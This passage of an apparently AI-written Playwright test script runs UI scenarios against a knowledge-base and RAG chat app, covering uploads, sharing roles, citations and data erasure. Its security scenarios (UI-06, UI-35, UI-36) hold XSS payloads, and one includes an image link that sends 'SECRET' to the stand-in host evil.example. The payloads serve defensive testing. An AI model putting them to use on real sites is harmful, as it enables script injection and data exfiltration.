const { chromium } = require('playwright');
const fs = require('fs'); const path = require('path');
const CYCLE = process.argv[2] || 'c1'; const ONLY = process.argv[3] ? new RegExp(process.argv[3]) : null;
const API = 'http://127.0.0.1:8000', IDP = 'http://localhost:8180', WEB = 'http://localhost:5173';
const RUN = Math.random().toString(36).slice(2, 7);
const CORPUS = '/tmp/claude-0/qa/corpus';
const results = []; const SC = [];
const S = (id, area, description, preconditions, steps, expected, fn) => SC.push({ id, area, kind: 'UI', description, preconditions, steps, expected, fn });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const mint = async (sub, q = {}) => (await fetch(`${IDP}/qa/mint?` + new URLSearchParams({ sub, ...q }))).text();
async function apiCall(sub, method, p, body, q) { const t = await mint(sub, q); const r = await fetch(API + p, { method, headers: { Authorization: 'Bearer ' + t, ...(body && !(body instanceof FormData) ? { 'Content-Type': 'application/json' } : {}) }, body: body instanceof FormData ? body : body ? JSON.stringify(body) : undefined }); let j = null; try { j = await r.json() } catch {} return { status: r.status, json: j }; }
async function seedKb(sub, name, files = [], extra = {}) {
  const kb = (await apiCall(sub, 'POST', '/v1/knowledge/bases', { name, ...extra })).json.kb_id; const ids = [];
  for (const f of files) { const fd = new FormData(); const buf = fs.readFileSync(path.join(CORPUS, f)); fd.append('file', new Blob([buf], { type: f.endsWith('.md') ? 'text/markdown' : f.endsWith('.csv') ? 'text/csv' : 'text/plain' }), f); const r = await apiCall(sub, 'POST', `/v1/knowledge/bases/${kb}/documents`, fd); ids.push(r.json.doc_id); }
  for (const d of ids) for (let i = 0; i < 90; i++) { const s = (await apiCall(sub, 'GET', `/v1/knowledge/documents/${d}`)).json.status; if (s === 'ready' || s === 'failed') break; await sleep(1000); }
  return kb;
}
async function signIn(page, user, roles = '') {
  await page.goto(WEB + '/'); await page.getByRole('button', { name: /sign in/i }).click();
  await page.locator('#username').fill(user); await page.locator('#roles').fill(roles); await page.locator('#login').click();
  await page.getByText(`Signed in as ${user}`).waitFor({ timeout: 15000 });
}
const nav = (page, name) => page.getByRole('button', { name, exact: true }).first().click();
async function ask(page, text) {
  const composer = page.getByRole('textbox', { name: 'Message' }); await composer.fill(text); await composer.press('Enter');
  await page.getByText('Was this answer helpful?').last().waitFor({ timeout: 150000 }); await sleep(800);
  return page.getByRole('log', { name: 'Messages' }).innerText();
}
const ok = (cond, actual, obs = '') => [actual, !!cond, obs];

// ---------- scenarios ----------
S('UI-01', 'Access', 'Landing page offers sign-in and shows no user data when signed out', 'Signed out browser', 'Open /', 'Sign in button visible; no conversations, no Knowledge nav', async ({ page }) => {
  await page.goto(WEB + '/'); const sign = await page.getByRole('button', { name: /sign in/i }).isVisible(); const k = await page.getByRole('button', { name: 'Knowledge', exact: true }).count();
  return ok(sign && k === 0, { sign, knowledgeNav: k });
});
S('UI-02', 'Access', 'Sign in through the OIDC provider and land on chat', 'IdP running', 'Click Sign in, enter username, Log in', 'Signed in as <user>; chat composer visible', async ({ page, user }) => {
  await signIn(page, user); return ok(await page.getByRole('textbox', { name: 'Message' }).isVisible(), 'signed in, composer visible');
});
S('UI-03', 'Knowledge UI', 'Knowledge screen shows explanatory text and empty state for a new user', 'Signed in new user', 'Open Knowledge', 'Create form + "No knowledge bases yet."', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); const t = await page.locator('main').innerText(); return ok(t.includes('No knowledge bases yet.') && t.includes('New knowledge base'), t.slice(0, 120));
});
S('UI-04', 'Knowledge UI', 'Create a knowledge base; it is listed and opens its documents panel', 'Signed in', 'Type name, click Create', 'Base listed with Hosted badge, Documents panel visible', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Handbook'); await page.getByRole('button', { name: 'Create' }).click();
  await page.getByRole('region', { name: 'Documents in Handbook' }).waitFor({ timeout: 10000 }); return ok(true, 'panel visible');
});
S('UI-05', 'Knowledge UI', 'Create with empty name is blocked with feedback', 'Signed in', 'Click Create with blank name', 'No base created; message or disabled button, no crash', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); const btn = page.getByRole('button', { name: 'Create' }); const disabled = await btn.isDisabled(); if (!disabled) await btn.click(); await sleep(800);
  const n = (await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases.length; const alert = await page.getByRole('alert').first().innerText().catch(() => ''); return ok(n === 0 && /1 to 80/.test(alert), { disabled, bases: n, alert });
});
S('UI-06', 'Knowledge UI', 'HTML/script in a base name is rendered as inert text (no XSS)', 'Signed in', 'Create base named <img src=x onerror=window.__xss=1>', 'Text shown literally; window.__xss undefined', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('<img src=x onerror=window.__xss=1>'); await page.getByRole('button', { name: 'Create' }).click(); await sleep(1500);
  const x = await page.evaluate(() => window.__xss); const imgs = await page.locator('main img[src="x"]').count(); const txt = await page.locator('main').innerText(); return ok(x === undefined && imgs === 0 && txt.includes('<img src=x'), { xss: x, imgs });
});
S('UI-07', 'Knowledge UI', 'Create base with Self-hosted processing and German language', 'Signed in', 'Choose Self-hosted, German, Create', 'Base listed with Self-hosted badge; API language german', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Deutsch'); await page.getByLabel(/Self-hosted only/).check(); await page.getByLabel(/Language of its documents/).selectOption({ label: 'German' }); await page.getByRole('button', { name: 'Create' }).click(); await sleep(1500);
  const b = (await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases[0]; return ok(b && b.language === 'german' && b.processing === 'self_hosted', b);
});
S('UI-08', 'Documents UI', 'Upload a Markdown file and watch it become Ready without reload', 'Base open', 'Choose file; wait', 'Row appears, status reaches Ready', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Handbook'); await page.getByRole('button', { name: 'Create' }).click();
  const panel = page.getByRole('region', { name: 'Documents in Handbook' }); await panel.getByLabel(/Drop files here/).setInputFiles(path.join(CORPUS, 'vacation_policy.md'));
  const row = panel.getByRole('listitem').filter({ hasText: 'vacation_policy.md' }); await row.getByText('Ready').waitFor({ timeout: 60000 }); return ok(true, 'Ready shown');
});
S('UI-09', 'Documents UI', 'Upload several files at once (txt, csv, md)', 'Base open', 'Select 3 files', 'All three rows reach Ready (or queued per concurrency cap) without error banner', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Multi'); await page.getByRole('button', { name: 'Create' }).click();
  const panel = page.getByRole('region', { name: 'Documents in Multi' }); await panel.getByLabel(/Drop files here/).setInputFiles(['expenses.txt', 'headcount.csv', 'vacation_policy.md'].map(f => path.join(CORPUS, f)));
  for (const f of ['expenses.txt', 'headcount.csv', 'vacation_policy.md']) await panel.getByRole('listitem').filter({ hasText: f }).getByText('Ready').waitFor({ timeout: 90000 }); return ok(true, 'three Ready');
});
S('UI-10', 'Documents UI', 'Unsupported file type is refused with a readable message', 'Base open', 'Upload blob.bin', 'Error text explains the type is unsupported; no row stuck', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Bad'); await page.getByRole('button', { name: 'Create' }).click();
  const panel = page.getByRole('region', { name: 'Documents in Bad' }); await panel.getByLabel(/Drop files here/).setInputFiles({ name: 'tool.exe', mimeType: 'application/octet-stream', buffer: Buffer.from([0, 1, 2, 3]) }); await sleep(2500);
  const t = await panel.innerText(); const rows = await panel.getByRole('listitem').count(); return ok(/not supported|unsupported|can't|cannot|type/i.test(t), t.slice(0, 400), `rows=${rows}`);
});
S('UI-11', 'Documents UI', 'A document that fails to process shows a human-readable reason', 'Base open; no PDF parser deployed', 'Upload corrupt .pdf', 'Row shows Failed with plain-language reason', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Fail'); await page.getByRole('button', { name: 'Create' }).click();
  const panel = page.getByRole('region', { name: 'Documents in Fail' }); await panel.getByLabel(/Drop files here/).setInputFiles({ name: 'broken.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 garbage'.padEnd(300, 'x')) });
  await panel.getByText(/Failed/).first().waitFor({ timeout: 60000 }); const t = await panel.innerText(); return ok(!/error_code|processing_unavailable|_/.test(t.replace(/vacation_policy|\.pdf/g, '')), t.slice(0, 300), 'check wording');
});
S('UI-12', 'Documents UI', 'Add a web page with an http:// URL is refused in plain words', 'Base open', 'Enter http://example.com, Add page', 'Error mentions https/public address; nothing queued', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Web'); await page.getByRole('button', { name: 'Create' }).click();
  const panel = page.getByRole('region', { name: 'Documents in Web' }); await panel.getByLabel('Web page address').fill('http://example.com/a'); await panel.getByRole('button', { name: 'Add page' }).click(); await sleep(1500);
  const t = await panel.innerText(); return ok(/https|public|address/i.test(t.split('Add page')[1] || t), (t.split('Add page')[1] || '').slice(0, 250));
});
S('UI-13', 'Documents UI', 'Delete a document needs confirmation, then it disappears', 'Base with one ready doc', 'Click trash, Confirm', 'Row removed; search no longer finds it', async ({ page, user }) => {
  const kb = await seedKb(user, 'Del', ['expenses.txt']); await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Del', exact: true }).click();
  const panel = page.getByRole('region', { name: 'Documents in Del' }); await panel.getByRole('button', { name: 'Delete expenses.txt' }).click(); await panel.getByRole('button', { name: /Confirm|Delete$/ }).last().click(); await sleep(1500);
  const n = await panel.getByRole('listitem').filter({ hasText: 'expenses.txt' }).count(); return ok(n === 0, { rowsLeft: n });
});
S('UI-14', 'Knowledge UI', 'Delete a base is two-step (Confirm delete / Cancel)', 'Owner with a base', 'Delete -> Cancel keeps it; Delete -> Confirm removes it', 'Cancel keeps; Confirm removes', async ({ page, user }) => {
  await seedKb(user, 'Trash'); await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Delete Trash' }).click(); await page.getByRole('button', { name: 'Cancel' }).click();
  const kept = await page.getByRole('button', { name: 'Trash', exact: true }).count(); await page.getByRole('button', { name: 'Delete Trash' }).click(); await page.getByRole('button', { name: 'Confirm delete' }).click(); await sleep(1500);
  const gone = await page.getByRole('button', { name: 'Trash', exact: true }).count(); return ok(kept === 1 && gone === 0, { kept, gone });
});
S('UI-15', 'Knowledge UI', 'Rename a base inline', 'Owner with a base', 'Click Rename, type, save', 'New name shown and persisted via API', async ({ page, user }) => {
  await seedKb(user, 'OldName'); await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Rename OldName' }).click();
  const input = page.getByRole('textbox', { name: /name/i }).last(); await input.fill('NewName'); await input.press('Enter'); await sleep(1500);
  const names = (await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases.map(b => b.name); return ok(names.includes('NewName'), names);
});
S('UI-16', 'Sharing UI', 'Share a base with a role and see it listed; remove it again', 'Owner with a base', 'Enter role "eng", access Read, Share; then stop sharing', 'Grant row appears and persists after reload; removal empties list', async ({ page, user }) => {
  await seedKb(user, 'Shareable'); await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Shareable', exact: true }).click();
  await page.getByLabel('Role', { exact: true }).fill('eng'); await page.getByRole('button', { name: 'Share', exact: true }).click(); await sleep(1500); await page.reload(); await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Shareable', exact: true }).click(); await sleep(800);
  const listed = await page.getByRole('button', { name: /Stop sharing with eng/ }).count(); await page.getByRole('button', { name: /Stop sharing with eng/ }).click(); await sleep(1200); const after = await page.getByText('Not shared with any role.').count(); return ok(listed === 1 && after === 1, { listed, after });
});
S('UI-17', 'Sharing UI', 'Role holder sees the shared base read-only (no rename/delete/upload)', 'Alice shared base with role "eng" (Read)', 'Sign in as bob with role eng; open Knowledge', 'Badge "Shared with you · Read"; no Rename/Delete; upload hidden/disabled', async ({ page, user }) => {
  const kb = await seedKb(user + 'o', 'TeamDocs', ['expenses.txt']); await apiCall(user + 'o', 'PUT', `/v1/knowledge/bases/${kb}/grants`, { grants: [{ role: 'eng' + RUN, access: 'read' }] });
  await signIn(page, user, 'eng' + RUN); await nav(page, 'Knowledge'); await page.getByText('Shared with you').first().waitFor({ timeout: 10000 }).catch(() => {}); const t = await page.locator('main').innerText(); const ren = await page.getByRole('button', { name: /Rename TeamDocs/ }).count(); const del = await page.getByRole('button', { name: /Delete TeamDocs/ }).count();
  await page.getByRole('button', { name: 'TeamDocs', exact: true }).first().click(); await sleep(800); const drop = await page.getByLabel(/Drop files here/).count(); const trash = await page.getByRole('button', { name: /Delete expenses/ }).count();
  return ok(/Shared with you/.test(t) && ren === 0 && del === 0 && trash === 0, { badge: /Shared with you/.test(t), ren, del, dropzone: drop, trash }, `dropzone count for read-only user: ${drop}`);
});
S('UI-18', 'Tenant isolation', "A different user never sees another user's bases in the UI", 'Alice has bases', 'Sign in as a fresh user; open Knowledge', 'Empty list', async ({ page, user }) => {
  await seedKb(user + 'a', 'AliceSecret', ['expenses.txt']); await signIn(page, user + 'b'); await nav(page, 'Knowledge'); await page.getByText('No knowledge bases yet.').waitFor({ timeout: 10000 }).catch(() => {}); const t = await page.locator('main').innerText(); return ok(!t.includes('AliceSecret') && t.includes('No knowledge bases yet.'), t.slice(0, 80));
});
S('UI-19', 'Chat + RAG', 'Ask a question over the base: answer is grounded, Sources chips shown', 'Base with vacation policy (live LLM)', 'Ask carry-over question', 'Answer contains 10 days; Sources list has chip for vacation_policy.md', async ({ page, user }) => {
  await seedKb(user, 'Handbook', ['vacation_policy.md']); await signIn(page, user); const log = await ask(page, 'How many vacation days can I carry over to the next year?');
  const chips = await page.getByRole('list', { name: 'Sources' }).getByRole('button').allInnerTexts(); return ok(/10/.test(log) && chips.some(c => /vacation_policy/.test(c)), { answer: log.slice(-200), chips });
});
S('UI-20', 'Chat + RAG', 'Opening a source chip shows the cited passage; Close works', 'After UI-19 style answer', 'Click chip; read passage; Close source', 'Sheet shows passage text from the document', async ({ page, user }) => {
  await seedKb(user, 'Handbook', ['vacation_policy.md']); await signIn(page, user); await ask(page, 'How many vacation days can I carry over?');
  await page.getByRole('list', { name: 'Sources' }).getByRole('button').first().click(); const sheet = page.getByRole('region', { name: /vacation_policy\.md/ }); await sheet.waitFor({ timeout: 10000 }); const t = await sheet.innerText();
  await page.getByRole('button', { name: 'Close source' }).click(); await sleep(500); const closed = await sheet.count() === 0; return ok(/carry over|vacation/i.test(t) && closed, { passage: t.slice(0, 160), closed });
});
S('UI-21', 'Chat + RAG', 'Unanswerable question: no fabricated citation; says nothing in documents', 'Base with vacation policy', "Ask 'What is the CEO's salary?'", 'No Sources chips; answer says not in documents', async ({ page, user }) => {
  await seedKb(user, 'Handbook', ['vacation_policy.md']); await signIn(page, user); const log = await ask(page, "What is the CEO's salary according to my documents?"); const chips = await page.getByRole('list', { name: 'Sources' }).count();
  return ok(chips === 0 && /not|no |don't|cannot/i.test(log), { chips, answer: log.slice(-250) });
});
S('UI-22', 'Chat + RAG', 'Knowledge picker limits the run to chosen bases', 'Two bases: Vacation and Travel', 'Open picker, select only Travel, ask vacation question', 'Answer cites no vacation doc (or says not found)', async ({ page, user }) => {
  await seedKb(user, 'VacBase', ['vacation_policy.md']); await seedKb(user, 'TravelBase', ['expenses.txt']); await signIn(page, user);
  await page.getByRole('button', { name: /Knowledge to search/ }).click(); await sleep(400); const info = { checkboxes: await page.getByRole('checkbox').count() }; await page.getByRole('checkbox', { name: 'TravelBase' }).check(); info.label = await page.getByRole('button', { name: /Knowledge to search/ }).innerText();
  await page.keyboard.press('Escape'); const log = await ask(page, 'How many vacation days carry over?'); const chips = await page.getByRole('list', { name: 'Sources' }).getByRole('button').allInnerTexts().catch(() => []); return ok(!chips.some(c => /vacation_policy/.test(c)), { info, chips, answer: log.slice(-160) });
});
S('UI-23', 'Chat + RAG', 'Citations survive a page reload (read back from history)', 'Answered conversation', 'Reload; open the conversation from the list', 'Sources chips still present', async ({ page, user }) => {
  await seedKb(user, 'Handbook', ['vacation_policy.md']); await signIn(page, user); await ask(page, 'How many vacation days carry over?'); await page.reload(); await signIn(page, user);
  await page.getByRole('button', { name: /vacation/i }).first().click().catch(() => {}); await sleep(2000); const chips = await page.getByRole('list', { name: 'Sources' }).getByRole('button').count(); return ok(chips >= 1, { chips });
});
S('UI-24', 'Chat + RAG', 'Conversation appears in the sidebar and can be deleted', 'Answered conversation', 'Send a message; delete conversation', 'Listed then removed', async ({ page, user }) => {
  await signIn(page, user); const t0 = await ask(page, 'What is 18% of 2450?'); await sleep(1500); const before = await page.getByText('No conversations yet.').count();
  const del = page.getByRole('button', { name: /delete/i }).first(); const d = await del.count(); if (d) { await del.click(); const c = page.getByRole('button', { name: /confirm|delete/i }).last(); await c.click().catch(() => {}); await sleep(1500); } const after = await page.getByText('No conversations yet.').count();
  return ok(before === 0 && after === 1, { before, after, answer: t0.slice(-80) });
});
S('UI-25', 'Data & privacy', 'Your data: erase all data needs the typed phrase, signs the user out and removes knowledge', 'User with a base + doc', 'Open Your data; type "erase my data"; Erase all my data', 'Button disabled until phrase typed; after erase user is signed out and API shows no bases', async ({ page, user }) => {
  await seedKb(user, 'ToErase', ['expenses.txt']); await signIn(page, user); await nav(page, 'Your data'); await page.getByText('Erase your data').first().waitFor(); await sleep(800);
  const btn = page.getByRole('button', { name: 'Erase all my data' }); const disabledBefore = await btn.isDisabled(); await page.getByRole('textbox', { name: /erase my data|confirm/i }).or(page.locator('input[type=text]').last()).first().fill('erase my data'); const enabledAfter = await btn.isEnabled(); await btn.click(); await sleep(2500); let repeated = false;
  if (await page.getByText(/Try again in a moment/).count()) { repeated = true; for (let i = 0; i < 6 && !(await page.getByRole('button', { name: /sign in/i }).isVisible().catch(() => false)); i++) { await sleep(4000); const box = page.getByRole('textbox').last(); if (await box.count()) { await box.fill('erase my data'); await btn.click().catch(() => {}); await sleep(1500); } } }
  await page.getByRole('button', { name: /sign in/i }).waitFor({ timeout: 15000 }).catch(() => {}); await sleep(1000);
  const signedOut = await page.getByRole('button', { name: /sign in/i }).isVisible().catch(() => false); const n = (await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases.length; return ok(disabledBefore && enabledAfter && signedOut && n === 0, { disabledBefore, enabledAfter, repeatedAfterPurgePending: repeated, signedOut, bases: n });
});
S('UI-26', 'Access', 'Sign out returns to the landing page and hides user data', 'Signed in', 'Click sign-out; use Back', 'Landing shown; Back does not reveal data', async ({ page, user }) => {
  await signIn(page, user); await page.getByRole('button', { name: /sign out|log out/i }).click(); await sleep(1500); const landing = await page.getByRole('button', { name: /sign in/i }).isVisible().catch(() => false); await page.goBack().catch(() => {}); await sleep(1000);
  const leaked = await page.getByText(`Signed in as ${user}`).count(); return ok(landing && leaked === 0, { landing, leaked });
});
S('UI-27', 'Responsive', 'Mobile viewport (390x844): Knowledge usable without horizontal scroll', 'Signed in', 'Resize to phone; open Knowledge', 'No horizontal overflow; create form visible', async ({ page, user }) => {
  await page.setViewportSize({ width: 390, height: 844 }); await signIn(page, user).catch(async () => {}); const menu = page.getByRole('button', { name: /menu|navigation|sidebar/i }); if (await menu.count()) await menu.first().click().catch(() => {});
  await nav(page, 'Knowledge').catch(() => {}); await sleep(800); await page.screenshot({ path: `/tmp/claude-0/qa/shots/${CYCLE}-mobile-knowledge.png` }); const ov = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth); return ok(ov <= 1, { horizontalOverflowPx: ov });
});
S('UI-28', 'Accessibility', 'Keyboard-only: create a base with Tab/Enter', 'Signed in', 'Focus name field via keyboard, type, Enter', 'Base created without mouse', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').focus(); await page.keyboard.type('KeyboardBase'); await page.keyboard.press('Enter'); await sleep(1500);
  const names = (await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases.map(b => b.name); return ok(names.includes('KeyboardBase'), names);
});
S('UI-29', 'Accessibility', 'axe-core: no violations on Knowledge screen (light + dark)', 'Signed in with a base and doc', 'Run axe', 'Zero violations', async ({ page, user }) => {
  await seedKb(user, 'Axe', ['expenses.txt']); await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Axe', exact: true }).click(); await sleep(1000); const out = {};
  for (const scheme of ['light', 'dark']) { await page.emulateMedia({ colorScheme: scheme }); await sleep(700); await page.addScriptTag({ path: require.resolve('/home/user/neuron/web/node_modules/axe-core/axe.min.js') }); out[scheme] = await page.evaluate(async () => (await window.axe.run(document.querySelector('main'), { resultTypes: ['violations'] })).violations.map(v => v.id + ':' + v.nodes.length)); }
  return ok(!out.light.length && !out.dark.length, out);
});
S('UI-30', 'Resilience', 'API outage while on Knowledge screen shows an error, not a blank page', 'Signed in', 'Abort /v1/knowledge requests; reload Knowledge', 'Visible error / retry text; app shell intact', async ({ page, user }) => {
  await signIn(page, user); await page.route('**/v1/knowledge/**', r => r.abort()); await nav(page, 'Knowledge'); await sleep(2500); const t = await page.locator('main').innerText(); const shell = await page.getByRole('button', { name: 'Chat', exact: true }).count();
  return ok(t.trim().length > 30 && /couldn't|could not|error|try again|unavailable|failed/i.test(t) && shell, t.slice(0, 250));
});
S('UI-31', 'Resilience', 'Server 503 on search/chat shows a friendly error and the composer stays usable', 'Signed in', 'Mock /v1/agent/stream -> 503, send message', 'Error text visible; composer enabled again', async ({ page, user }) => {
  await signIn(page, user); await page.route('**/v1/agent/stream', r => r.fulfill({ status: 503, contentType: 'application/json', body: '{"detail":"service_shutting_down"}' })); const composer = page.getByRole('textbox', { name: 'Message' }); await composer.fill('hello'); await composer.press('Enter'); await sleep(2500);
  const t = await page.locator('main').innerText(); return ok(await composer.isEnabled() && /try again|unavailable|couldn't|error|busy/i.test(t), t.slice(-250));
});
S('UI-32', 'Knowledge UI', 'Double-clicking Create does not create duplicate bases', 'Signed in', 'Type name, double-click Create', 'Exactly one base', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Once'); await page.getByRole('button', { name: 'Create' }).dblclick(); await sleep(2000); const n = (await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases.filter(b => b.name === 'Once').length; return ok(n === 1, { count: n });
});
S('UI-33', 'Knowledge UI', 'Name over 80 chars is handled with a visible message (no silent failure)', 'Signed in', 'Create base with 120-char name', 'Client limits input or shows an error; no base created silently', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); const long = 'N'.repeat(120); await page.getByLabel('New knowledge base').fill(long); await page.getByRole('button', { name: 'Create' }).click(); await sleep(1500);
  const v = await page.getByLabel('New knowledge base').inputValue(); const n = (await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases.length; const t = await page.locator('main').innerText(); return ok((v.length <= 80 && n <= 1) || n === 0 && /80|long|characters|name/i.test(t), { inputLen: v.length, bases: n, msg: (t.match(/[^\n]*(80|too long|characters)[^\n]*/i) || [''])[0] });
});
S('UI-34', 'Documents UI', 'Download an original file from the documents list', 'Ready document', 'Click the document title / download', 'A file download starts with the original name', async ({ page, user }) => {
  await seedKb(user, 'Dl', ['expenses.txt']); await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Dl', exact: true }).click(); const panel = page.getByRole('region', { name: 'Documents in Dl' });
  const link = panel.getByRole('link', { name: /expenses\.txt/ }).or(panel.getByRole('button', { name: /download|expenses\.txt/i })).first(); const [dl] = await Promise.all([page.waitForEvent('download', { timeout: 10000 }).catch(() => null), link.click()]); return ok(dl && /expenses/.test(dl.suggestedFilename()), dl ? dl.suggestedFilename() : 'no download');
});

S('UI-35', 'Security', 'Answer renderer: remote image, javascript: link and raw HTML in a model answer are inert', 'Signed in; model asked to echo hostile markdown', 'Ask the model to reply with an external image, a javascript: link and an <img onerror>', 'No request to evil.example; no dialog; window.__xss undefined; no javascript: href', async ({ page, user }) => {
  const hits = []; page.on('request', r => { if (/evil\.example/.test(r.url())) hits.push(r.url()); }); await signIn(page, user);
  const log = await ask(page, 'Reply with exactly the following text and nothing else: ![x](https://evil.example/l.png?d=SECRET) [click me](javascript:window.__xss=1) <img src=x onerror=window.__xss=1> <script>window.__xss=2</script>');
  const hrefs = await page.locator('[role=log] a').evaluateAll(a => a.map(x => x.getAttribute('href'))); const xss = await page.evaluate(() => window.__xss); const imgs = await page.locator('[role=log] img').evaluateAll(i => i.map(x => x.getAttribute('src')));
  return ok(hits.length === 0 && xss === undefined && !hrefs.some(h => /^javascript:/i.test(h || '')) && !imgs.some(x => /evil/.test(x || '')), { requests: hits, xss, hrefs, imgs, answer: log.slice(-200) });
});
S('UI-36', 'Security', 'Hostile document title / base name stays inert in the picker, sources and sheet', 'Base named with HTML and a doc with HTML in its name', 'Seed hostile names; open Chat picker and Knowledge list', 'Rendered as text; no script execution', async ({ page, user }) => {
  const kb = await seedKb(user, '<b onmouseover=window.__xss=1>Bold</b>', []); const fd = new FormData(); fd.append('file', new Blob(['Hostile titled note about walruses.'], { type: 'text/plain' }), '<img src=x onerror=window.__xss=1>.txt'); await apiCall(user, 'POST', `/v1/knowledge/bases/${kb}/documents`, fd); await sleep(6000);
  await signIn(page, user); await nav(page, 'Knowledge'); await sleep(1000); await page.getByRole('button', { name: /Bold/ }).first().click().catch(() => {}); await sleep(1500); await nav(page, 'Chat'); await page.getByRole('button', { name: /Knowledge to search/ }).click().catch(() => {}); await sleep(800);
  const xss = await page.evaluate(() => window.__xss); const imgs = await page.locator('main img[src="x"]').count(); return ok(xss === undefined && imgs === 0, { xss, imgs });
});

S('UI-37', 'Chat + RAG', 'Opening a citation whose document was deleted afterwards fails gracefully', 'Answered conversation with a source chip; document then deleted via API', 'Delete the document; click the source chip', 'A readable message; no blank sheet, no crash, app still usable', async ({ page, user }) => {
  const kb = await seedKb(user, 'Handbook', ['vacation_policy.md']); await signIn(page, user); await ask(page, 'How many vacation days can I carry over?');
  const docs = (await apiCall(user, 'GET', `/v1/knowledge/bases/${kb}/documents`)).json.documents; for (const d of docs) await apiCall(user, 'DELETE', `/v1/knowledge/documents/${d.doc_id}`); await sleep(1500);
  await page.getByRole('list', { name: 'Sources' }).getByRole('button').first().click(); await sleep(2500); const body = await page.locator('main').innerText(); const composer = await page.getByRole('textbox', { name: 'Message' }).isEnabled();
  const sheet = await page.getByRole('region', { name: /vacation_policy/ }).innerText().catch(() => ''); return ok(composer && /no longer|not found|couldn't|could not|unavailable|deleted|removed/i.test(sheet || body), { sheet: sheet.slice(0, 200), composer });
});
S('UI-38', 'Sharing UI', 'Write role gets upload/delete but not rename; Manage role gets rename and sharing', 'Base shared with roles w-RUN (write) and a-RUN (admin)', 'Sign in as each role holder; inspect controls', 'write: dropzone + delete-doc, no rename/delete-base; admin: rename + sharing panel, no delete-base', async ({ page, user, browser }) => {
  const kb = await seedKb(user + 'o', 'Collab', ['expenses.txt']); await apiCall(user + 'o', 'PUT', `/v1/knowledge/bases/${kb}/grants`, { grants: [{ role: 'w' + RUN, access: 'write' }, { role: 'a' + RUN, access: 'admin' }] });
  const probe = async (u, role) => { const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } }); const p = await ctx.newPage(); await signIn(p, u, role); await nav(p, 'Knowledge'); await p.getByText('Shared with you').first().waitFor({ timeout: 10000 }); await p.getByRole('button', { name: 'Collab', exact: true }).first().click(); await sleep(1200);
    const r = { drop: await p.getByLabel(/Drop files here/).count(), delDoc: await p.getByRole('button', { name: /Delete expenses/ }).count(), rename: await p.getByRole('button', { name: /Rename Collab/ }).count(), delBase: await p.getByRole('button', { name: /^Delete Collab/ }).count(), sharing: await p.getByRole('region', { name: /Sharing/ }).count() }; await ctx.close(); return r; };
  const w = await probe(user + 'w', 'w' + RUN); const a = await probe(user + 'a', 'a' + RUN);
  return ok(w.drop === 1 && w.delDoc === 1 && w.rename === 0 && w.delBase === 0 && a.rename === 1 && a.sharing === 1 && a.delBase === 0, { write: w, admin: a });
});
S('UI-39', 'Documents UI', 'A base with more than one page of documents shows the total and lets the user load the rest', '55 documents in one base', 'Open the base', 'List indicates total 55 and offers a way to see the rest; no silent truncation', async ({ page, user }) => {
  const kb = (await apiCall(user, 'POST', '/v1/knowledge/bases', { name: 'Many' })).json.kb_id; let sent = 0;
  while (sent < 55) { const fd = new FormData(); fd.append('file', new Blob([`note ${sent} unique ${Math.random()}`], { type: 'text/plain' }), `note-${String(sent).padStart(2, '0')}.txt`); const r = await apiCall(user, 'POST', `/v1/knowledge/bases/${kb}/documents`, fd); if (r.status === 202) sent++; else if (r.status === 429) await sleep(1500); else throw new Error('upload ' + r.status); }
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByRole('button', { name: 'Many', exact: true }).click(); await sleep(2500); const panel = page.getByRole('region', { name: 'Documents in Many' }); const shown = await panel.getByRole('listitem').count(); const txt = await panel.innerText(); const more = page.getByRole('button', { name: /more|load|show/i });
  let after = shown; if (await more.count()) { await more.first().click(); await sleep(2000); after = await panel.getByRole('listitem').count(); } return ok(shown < 55 ? (/55/.test(txt) && after > shown) : shown === 55, { shown, afterLoadMore: after, hint: (txt.match(/[^\n]*55[^\n]*/) || [''])[0] });
});

S('UI-40', 'Documents UI', 'Dropping 8 files at once (server caps ingestion at 5) ends with every file Ready or a clear per-file message', 'Base open', 'Select 8 text files at once', 'All 8 rows reach Ready (UI retries on 429) or show an explicit reason; none silently missing', async ({ page, user }) => {
  await signIn(page, user); await nav(page, 'Knowledge'); await page.getByLabel('New knowledge base').fill('Burst'); await page.getByRole('button', { name: 'Create' }).click(); const panel = page.getByRole('region', { name: 'Documents in Burst' });
